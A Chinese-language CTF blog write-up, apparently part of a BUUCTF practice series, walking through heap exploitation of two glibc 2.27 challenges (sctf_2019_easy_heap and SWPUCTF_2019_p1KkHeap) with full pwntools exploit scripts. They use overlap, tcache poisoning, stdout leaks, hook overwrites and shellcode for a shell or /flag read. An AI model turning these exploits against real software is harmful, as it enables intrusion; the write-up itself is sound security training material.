<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(0x4a0)#0</span><br><span class="line">add(0x68)#1</span><br><span class="line">add(0x4f0)#2		这个好像只能f0结尾</span><br><span class="line">add(0x18)#3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x60 + p64(0x520)</span><br><span class="line">edit(1,payload)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">此时三个堆块合并成了一个大堆块</span><br></pre></td></tr></table></figure>

<p>那么此时这个大堆块里面就有一个main_arena地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(0x4a0)#0</span><br><span class="line">此时m地址因为这个堆块的申请被分到了下面去即</span><br><span class="line">free(0)</span><br><span class="line">这时候free又会导致向前合并那么此时有两处出现m地址</span><br><span class="line">一个是新的大堆块的前0x10字节</span><br><span class="line">还有一个地方就是我们刚刚一分为二的第二个堆块的前0x10字节</span><br><span class="line">add(0x4c0)#0</span><br><span class="line">此时我们多申请0x20字节那么我们就可以修改一个m地址的内容为IO地址</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x4a0 + p64(0) + p64(0x70) + &#39;\x60\x77&#39;</span><br><span class="line">edit(0,payload)</span><br><span class="line">接下来就是两次malloc</span><br><span class="line">add(0x60)#1</span><br><span class="line">add(0x60)#2</span><br><span class="line">payload &#x3D; p64(0xfbad1800) + p64(0)*3 + &#39;\x00&#39;</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214194359393.png?raw=true" alt="image-20220214194359393.png"></p>
<p>这个断点是在第二步骤的第一次free(0)后</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214194614673.png?raw=true" alt="image-20220214194614673.png"></p>
<p>这个爆破还是有玄学的我之前用6670一直出不了，一度以为能用这个方法，然后换个数字就可以了真就玄学</p>
<p>那么接下来就是故技重施修改free为system了</p>
<p>但这个太折磨了一直爆破不出来</p>
<h2 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;sctf_2019_easy_heap&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26641)</span><br><span class="line">elf &#x3D; ELF(&#39;sctf_2019_easy_heap&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.27.so&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def add(size):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Size: &#39;,str(size))</span><br><span class="line">def free(index):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Index: &#39;,str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Index: &#39;,str(index))</span><br><span class="line">	p.sendafter(&#39;Content: &#39;,str(content))</span><br><span class="line">	p.sendline(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">	add(0x4a0)#0</span><br><span class="line">	add(0x68)#1</span><br><span class="line">	add(0x4f0)#2</span><br><span class="line">	add(0x18)#3</span><br><span class="line"></span><br><span class="line">	free(0)</span><br><span class="line">	payload &#x3D; &#39;a&#39;*0x60 + p64(0x520)</span><br><span class="line">	edit(1,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line"></span><br><span class="line">	add(0x4a0)#0</span><br><span class="line">	free(0)</span><br><span class="line">	</span><br><span class="line">	add(0x4c0)#0</span><br><span class="line">	payload &#x3D; &#39;a&#39;*0x4a0 + p64(0) + p64(0x70) + &#39;\x60\xe7&#39;</span><br><span class="line">	edit(0,payload)</span><br><span class="line">	</span><br><span class="line">	add(0x60)#1</span><br><span class="line">	add(0x60)#2</span><br><span class="line">	payload &#x3D; p64(0xfbad1800) + p64(0)*3 + &#39;\x00&#39;</span><br><span class="line">	edit(2,payload)</span><br><span class="line">	</span><br><span class="line">	#stdout &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">	stdout &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">	libc_base &#x3D; stdout - 0x1150 - libc.sym[&#39;_IO_2_1_stdout_&#39;]</span><br><span class="line">	free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">	system_addr &#x3D; libc_sym + libc.sym[&#39;system&#39;]</span><br><span class="line">	print(hex(free_hook))</span><br><span class="line"></span><br><span class="line">	add(0x420)#4</span><br><span class="line">	add(0x28)#5</span><br><span class="line">	add(0x4f0)#6</span><br><span class="line">	add(0x18)#7</span><br><span class="line"></span><br><span class="line">	free(4)</span><br><span class="line">	payload &#x3D; &#39;a&#39;*0x20 + p64(0x460)</span><br><span class="line">	edit(5,payload)</span><br><span class="line">	free(5)</span><br><span class="line">	free(6)</span><br><span class="line"></span><br><span class="line">	add(0x420)#4</span><br><span class="line">	free(4)</span><br><span class="line">	</span><br><span class="line">	add(0x440)#4</span><br><span class="line">	payload &#x3D; &#39;a&#39;*0x420 + p64(0) + p64(0x30) + p64(free_hook)</span><br><span class="line">	edit(4,payload)</span><br><span class="line">	</span><br><span class="line">	add(0x20)#5</span><br><span class="line">	add(0x20)#6</span><br><span class="line">	payload &#x3D; p64(system_addr)</span><br><span class="line">	edit(6,payload)</span><br><span class="line"></span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	edit(5,&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">	free(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	#p.interactive()</span><br><span class="line"></span><br><span class="line">if(__name__ &#x3D;&#x3D; &#39;__main__&#39;):</span><br><span class="line">	while(1):</span><br><span class="line">		try:</span><br><span class="line">			#p &#x3D; process(&#39;sctf_2019_easy_heap&#39;)</span><br><span class="line">			p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26641)</span><br><span class="line">			pwn()</span><br><span class="line">			p.interactive()</span><br><span class="line">			break</span><br><span class="line">		except Exception as e:</span><br><span class="line">			print(e)</span><br><span class="line">			p.close()</span><br><span class="line">			continue</span><br></pre></td></tr></table></figure>

<p>参考链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_51055545&#x2F;article&#x2F;details&#x2F;122308672</span><br></pre></td></tr></table></figure>

<h2 id="换个思路"><a href="#换个思路" class="headerlink" title="换个思路"></a>换个思路</h2><p>既然我们都有off-by-one了那么我们可以尝试下unlink那么Unlink需要有一个控制链表并且我们在IDA分析中发现了mmap一段有rwx的空间</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220214201615628.png?raw=true" alt="image-20220214201615628.png"></p>
<p>那么我们既然能够利用overlap来进行IO修改泄露地址那么我们也可以用来修改mmap的内容即写入shellcode然后将malloc的内容改为mmap的地址来get_shell</p>
<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>我们先放exp然后再一步步解析，因为真的是步步为营太精妙了</p>
<h3 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h3><p>血的教训</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;sctf_2019_easy_heap&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26641)</span><br><span class="line">elf &#x3D; ELF(&#39;sctf_2019_easy_heap&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.27.so&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def add(size):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Size: &#39;,str(size))</span><br><span class="line">def free(index):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Index: &#39;,str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Index: &#39;,str(index))</span><br><span class="line">	p.sendafter(&#39;Content: &#39;,str(content))</span><br><span class="line">	p.sendline(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Mmap: 0x&#39;)</span><br><span class="line">mmap_addr &#x3D; int(p.recv(10),16)</span><br><span class="line">print(hex(mmap_addr))</span><br><span class="line">add(0x4c0)#0</span><br><span class="line">add(0x18)#1</span><br><span class="line">add(0x28)#2</span><br><span class="line">add(0x4f0)#3</span><br><span class="line">add(0x18)#4</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x20 + p64(0x520)</span><br><span class="line">edit(2,payload)</span><br><span class="line">free(3)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">add(0x4e0)#0</span><br><span class="line">#free(0)</span><br><span class="line">add(0x520)#1</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x4c0 + p64(0) + p64(0x21) + p64(mmap_addr+0x10)</span><br><span class="line">edit(0,payload)	</span><br><span class="line">add(0x18)#2</span><br><span class="line">add(0x18)#3</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">edit(3,shellcode)</span><br><span class="line">payload &#x3D; &#39;\x30&#39;</span><br><span class="line">edit(1,payload)</span><br><span class="line">add(0x28)#5</span><br><span class="line">add(0x28)#6</span><br><span class="line">edit(6,p64(mmap_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;Size: &quot;, str(16))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这是我第一次尝试的exp两个小时我都没搞懂知道后来我才发现如果我写的是0x18,0x28的话必须要用大的做填shecode的内容，因为0x18太小了装不下，卧槽！</p>
<p>然后我们放入正确的exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;sctf_2019_easy_heap&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,26641)</span><br><span class="line">elf &#x3D; ELF(&#39;sctf_2019_easy_heap&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.27.so&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def add(size):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Size: &#39;,str(size))</span><br><span class="line">def free(index):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Index: &#39;,str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">	p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Index: &#39;,str(index))</span><br><span class="line">	p.sendafter(&#39;Content: &#39;,str(content))</span><br><span class="line">	p.sendline(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Mmap: 0x&#39;)</span><br><span class="line">mmap_addr &#x3D; int(p.recv(10),16)</span><br><span class="line">print(hex(mmap_addr))</span><br><span class="line">add(0x480)#0</span><br><span class="line">add(0x38)#1</span><br><span class="line">add(0x48)#2</span><br><span class="line">add(0x4f0)#3</span><br><span class="line">add(0x18)#4</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x40 + p64(0x520)</span><br><span class="line">edit(2,payload)</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">add(0x4c0)#0</span><br><span class="line">#free(0)</span><br><span class="line">add(0x540)#1</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x480 + p64(0) + p64(0x41) + p64(mmap_addr+0x10)</span><br><span class="line">edit(0,payload)	</span><br><span class="line"></span><br><span class="line">add(0x38)#2</span><br><span class="line"></span><br><span class="line">add(0x38)#3</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">edit(3,shellcode)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;\x30&#39;</span><br><span class="line">edit(1,payload)</span><br><span class="line"></span><br><span class="line">add(0x48)#5</span><br><span class="line">add(0x48)#6</span><br><span class="line">edit(6,p64(mmap_addr))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;Size: &quot;, str(16))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.首先我们在决定malloc几个堆块和malloc堆块大小要多少的时候就已经为整个题目打下了基础——很重要</p>
<p>首先我们需要分析</p>
<p>a.我们需要至少一个堆块能够写入的大小能够容纳我们的shellcode的大小</p>
<p>b.我们到底要malloc多少个堆块呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x420)	合并</span><br><span class="line">add(0x28)	构建fake_chunk</span><br><span class="line">add(0x4f0)	合并</span><br><span class="line">add(0x18)	防止top_chunk合并</span><br></pre></td></tr></table></figure>

<p>如果是这样即我们最后会发现我们能够利用的chunk只有一个因为，当我们进行修改后tache机制中的对应大小size数量变为-1类似于损坏，我们不能够重复利用</p>
<p>但我们要实现get_shell至少要利用两次，第一次在mmap中写入shellcode，第二次将malloc的内容写为mmap的地址，因此我们需要构造两个小堆块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x480)#0</span><br><span class="line">add(0x38)#1		</span><br><span class="line">add(0x48)#2</span><br><span class="line">add(0x4f0)#3</span><br><span class="line">add(0x18)#4</span><br></pre></td></tr></table></figure>

<p>2.我们在如何利用overlap改写地址和修改内容？</p>
<p>我们要重新梳理一下什么是overlap即堆块被重复free那么此时我们的堆块存在的地址是否还在相应的位置呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(0x4c0)#0</span><br><span class="line">这里涉及到了计算，首先我们合并之后的大小为0xa21&#x3D;0x490+0x40+0x50+0x500</span><br><span class="line">此时我们重新Malloc的两个大堆块相加要和0xa21相同这是为我们后面的利用打下基础</span><br><span class="line">add(0x540)#1</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x480 + p64(0) + p64(0x41) + p64(mmap_addr+0x10)</span><br><span class="line">edit(0,payload)</span><br><span class="line">是不是很好奇为什么这样子就可以修改指针链到mmap的地址</span><br><span class="line">首先我们回顾一下overlap的知识点</span><br><span class="line">此时我们将0x4c0分为</span><br><span class="line">0x490 + 0x40</span><br><span class="line">那么这前面的0x490是属于Index&#x3D;0的堆块，我们首先将其填充</span><br><span class="line">那么就接下来是不是之前我们两次free的index&#x3D;1的堆块了呢，我们这时候malloc的时候它其实还是处于free的状态，我们这时候改了它残留的指针那么我们malloc第一次后它处于的状态就属于真正的free了，而非overlap中的free，于是我们修改的指针就会指向目标地址，接下来两次malloc就可以到达</span><br></pre></td></tr></table></figure>

<p>3.如何修改malloc的地址？</p>
<p>既然我们都明白为什么可以修改mmap的地址了</p>
<p>那么我们再看看堆的布局，此时我们0x540堆块的前面0x50字节想不想之前0x48堆块的地方</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;\x30&#39;</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>

<p>那么很简单我们直接修改它的指针即可</p>
<p>这里直接修改后面的字节即可，因为原本残留的地址和malloc_hook所在的地址只有后面两个字节不一样</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215183824985.png?raw=true" alt="image-20220215183824985.png"></p>
<p><strong>这题真的是精妙绝伦</strong></p>
<h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a>SWPUCTF_2019_p1KkHeap</h2><h2 id="Checksec-6"><a href="#Checksec-6" class="headerlink" title="Checksec"></a>Checksec</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215211542761.png?raw=true" alt="image-20220215211542761.png"></p>
<p>保护全开，功能齐全，版本是2.27</p>
<h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215211618678.png?raw=true" alt="image-20220215211618678.png"></p>
<p>发现存在Mmap函数且有一空间有RWX权限，那么根据上一题的总结，我们可以在改地址中写入shellcode然后改写malloc的内容为mmap的地址</p>
<p>并且我们发现这里的add函数和free函数皆有次数限制</p>
<p>add</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215212723012.png?raw=true" alt="image-20220215212723012.png"></p>
<p>malloc限制size大小不能超过0x100</p>
<p>free</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215212759160.png?raw=true" alt="image-20220215212759160.png"></p>
<p>并且这里存在一个UAF漏洞，我当时一下没看清还以为清零了呢，但后来再看一遍发现只是size清零，内容仍保留因此存在UAF</p>
<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>首先我们现在的困难就是我们的操作次数受到限制，我们再2.27中泄露地址就必须进入到unsortbin中，但又tcache机制的存在使得我们需要7次free只是违背程序的不可行，那么我们还有什么办法可以利用呢？</p>
<p>首先我们要明确自己所在的版本为2.27加入了tcache机制</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215211955915.png?raw=true" alt="image-20220215211955915.png"></p>
<p>我们再解读下Tcache_chunk的结构</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215212351104.png?raw=true" alt="image-20220215212351104.png"></p>
<p>那么我们此时箭头指向的个数是0x90被free的个数，并且我们知道tcache中存放完7个之后就会满然后再次free进去unsortbin或者fastbin，那么这一般是2.27版本中泄露地址的关键步骤，那么我们如果可以控制这个内容那么就可以强行填满tcache</p>
<p>并且下方的地址内容，如果我们可以改写就可以控制下一次malloc的地址达到任意写的目的</p>
<p>于是我们可以利用2.27版本的double_free来修改链表指针使得我们下一次mallo的地方为我们想到达的地方，这个地方我们可以写到tcache堆块，这样我们就可以间接操控堆了</p>
<p>1.写入tcache堆块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(0x80)#0</span><br><span class="line">add(0x80)#1</span><br><span class="line">free(0)</span><br><span class="line">free(0)   --double_free</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#39;content: &#39;)</span><br><span class="line">chunk_addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print(hex(chunk_addr))</span><br><span class="line">tcache_addr &#x3D; chunk_addr- 0x1e0-0x70</span><br><span class="line">#因为tcache的存在一般在堆开头所以可以利用堆的位置来进行计算使得我们进入精准的位置</span><br><span class="line">add(0x80)#2</span><br><span class="line">payload &#x3D; p64(tcache_addr)*2</span><br><span class="line">edit(2,payload）</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215213424840.png?raw=true" alt="image-20220215213424840.png"></p>
<p>2.修改tcache_chunk使得在mmap地址中写入shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x80)#3</span><br><span class="line">add(0x80)#4</span><br><span class="line">payload &#x3D; p64(0x0707070707070707).ljust(0x70,&#39;\x00&#39;) + p64(mmap_addr) + p64(0)</span><br><span class="line">edit(4,payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-3/image-20220215213911393.png?raw=true" alt="image-20220215213911393.png"></p>
<p>大家发现没有我们这里写道的地址是属于0x80的tcache地址，因为我发现和前面那题一样的问题很多任意写的地址只能使用一次就损坏了，因此我们可以利用0x80和0x90，当然从0x20-0x90皆可因为我们目前把对应的tcache个数都填满了并且我们Malloc的长度允许我们写到0x80,这也是个细节我们要知道我们Malloc的距离是有限的不能无限写，所以大家要精确布局</p>
<p>这里我说的损坏大概的意思就是假如我们这里使用0x80的tcache那么我遇到的问题就是在接下来泄露libc的时候无法泄露</p>
<p>3.那么我们再次malloc就写道了mmap地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(0x78)#5</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;)			--一定要写这个，又是血的教训</span><br><span class="line">#shellcode &#x3D; asm(shellcraft.sh())			--至于为什么不直接用这个，是因为我用了之后发现不行，就去网上看了别人的说开了沙箱，execv被禁用了</span><br><span class="line">shellcode &#x3D; shellcraft.open(&#39;&#x2F;flag&#39;)</span><br><span class="line">shellcode +&#x3D; shellcraft.read(3, mmap_addr+0x100, 50)</span><br><span class="line">shellcode +&#x3D; shellcraft.write(1, mmap_addr+0x100, 50)</span><br><span class="line"></span><br><span class="line">edit(5,asm(shellcode))</span><br></pre></td></tr></table></figure>

